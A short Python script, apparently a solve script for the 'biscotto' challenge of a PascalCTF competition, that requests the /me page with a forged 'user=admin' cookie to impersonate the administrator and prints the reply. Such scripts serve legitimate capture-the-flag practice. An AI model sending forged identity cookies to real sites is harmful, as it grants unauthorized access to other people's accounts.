#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests

def checker():
    url = f'https://{DOMAIN}/me'
    r = requests.get(url, cookies={'user': 'admin'})
    print(r.text)
    
if __name__ == '__main__':
    DOMAIN = "biscotto.challs.pascalctf.it"

    checker()